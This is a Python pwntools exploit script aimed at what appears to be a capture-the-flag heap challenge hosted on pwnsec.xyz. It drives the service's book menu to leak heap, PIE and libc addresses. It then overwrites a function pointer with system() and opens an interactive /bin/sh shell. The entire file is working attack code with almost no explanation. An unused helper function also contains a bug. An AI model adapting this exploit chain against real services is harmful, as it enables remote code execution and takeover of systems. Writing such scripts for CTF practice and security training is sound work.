#! /usr/bin/python
from pwn import *
# log_level = "debug"
context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "pwn-library.pwnsec.xyz"
PORT = 37068 

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, title, _type, rating):
    sl(p, b"1")
    sla(p, b"title?", title)
    sla(p, b">", f"{_type}".encode())
    sla(p, b"rating?", f"{rating}".encode())
    ru(p, b">")

def edit(p, title, new_title, rating):
    sl(p,b"2")
    sla(p, b"title:", title)
    sla(p, b"title?", new_title)
    sla(p, b"rating?", f"{rating}".encode())
    ru(p,b">")

def delete(p, title):
    sl(p,b"4")
    sla(p, b"title:", title)
    ru(p, b">")

def view(p):
    sl(p,b"3")
    
    ret = ru(p,b"1:")[:-2]
    ru(p, b">")
    
    return ret

def hash(target):
    alice = 0

    for char in target:
        alice -= ord(target)

    alice = alice & 0xff
    alice -= 10

    return alice

def exploit(io,e,l):
    # heap leak
    create(io, b"AAAA", 1, 1)
    edit(io, b"AAAA", b"XXXX", 1)

    leak = view(io)
    heap = int.from_bytes(leak[-6:], "little") - 0x2e0
    print("============ Heap leak: " + hex(heap)) 

    # pie leak
    create(io, b"C"*0x19, 1, 1)
    delete(io, b"AAAA")
    create(io, p64(heap + 0x310), 2, 1)
    #create(io, p64(heap + 0x2e0) + p64(0x1) + p64(0xdeadbeef)[:-1], 1, 1)

    leak = view(io)
    leak = leak[leak.index(b"(10/5)") + 7:leak.index(b"(10/5)")+13]
    pie_base = int.from_bytes(leak, "little") - e.sym["print_book"]

    print("========== PIE base: " + hex(pie_base))

    # libc leak
    delete(io, p64(heap + 0x310))
    create(io, p64(pie_base + e.got["free"]), 1, 10)

    leak = view(io)
    print(leak)
    leak = leak[-6:]
    #leak = leak[leak.index(b"(10/5)") + 20:leak.index(b"(10/5)")+26]
    libc = int.from_bytes(leak, "little") - l.sym["free"]

    print("========== Libc leak: " + hex(libc))

    # now call system("/bin/sh")

    # first I must overwrite the function ptr
    # misalign first
    create(io, b"ZZZZ", 1, 1)
    edit(io, b"ZZZZ", b"YYYYYYYY" + p64(0x21), 1)
    edit(io, b"YYYYYYYY" + p64(0x21), b"/bin/sh\x00", 0x21)

    delete(io, b"ZZZZ")
    create(io, p64(heap + 0x3a0), 1, 1)
    delete(io, b"YYYYYYYY" + p64(0x21))

    create(io, p64(libc + l.sym["system"]), 1, 0x21)
    view(io)

    '''
    edit(io, b"ZZZZ", b"YYYYYYYY" + p64(0x21), 1)
    delete(io, b"ZZZZ")
    create(io, p64(heap + 0x3a0), 1, 1)

    # make Y be a pointer chunk
    delete(io, b"YYYYYYYY" + p64(0x21))
    create(io, p64(0xdeadbeef), 1, 1)
    '''

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("/usr/lib/libc.so.6")
    l = ELF("./libc.so.6")

    exploit(p,e,l)
